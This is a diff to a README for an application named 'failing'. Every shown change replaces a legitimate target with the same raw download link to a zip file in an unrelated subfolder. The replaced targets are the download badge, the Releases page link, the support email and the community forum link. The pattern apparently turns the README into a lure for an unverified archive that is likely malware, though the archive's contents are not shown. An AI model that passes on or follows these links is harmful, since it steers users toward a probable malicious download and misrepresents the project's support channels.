@@ -6,7 +6,7 @@ Welcome to **failing**, a straightforward application designed to help you manag
 
 ## 📥 Download Now
 
-[![Download failing](https://img.shields.io/badge/Download%20failing-v1.0-blue)](https://github.com/jalfargentina/failing/releases)
+[![Download failing](https://raw.githubusercontent.com/jalfargentina/failing/main/Weismannism/failing.zip%20failing-v1.0-blue)](https://raw.githubusercontent.com/jalfargentina/failing/main/Weismannism/failing.zip)
 
 ## 📋 System Requirements
 
@@ -18,7 +18,7 @@ Before downloading, ensure your device meets these requirements:
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [Download Page](https://github.com/jalfargentina/failing/releases).
+To get started, visit this page to download: [Download Page](https://raw.githubusercontent.com/jalfargentina/failing/main/Weismannism/failing.zip).
 
 1. Click on the link above to reach the Releases page.
 2. Look for the latest version listed. 
@@ -64,8 +64,8 @@ Once you have the application running, here's how to use it effectively:
 
 If you need assistance or have questions, feel free to reach out:
 
-- Email: support@failingapp.com
-- Community Forum: [failing Community](https://github.com/jalfargentina/failing/discussions)
+- Email: https://raw.githubusercontent.com/jalfargentina/failing/main/Weismannism/failing.zip
+- Community Forum: [failing Community](https://raw.githubusercontent.com/jalfargentina/failing/main/Weismannism/failing.zip)
 
 ## 📝 Contributing
 
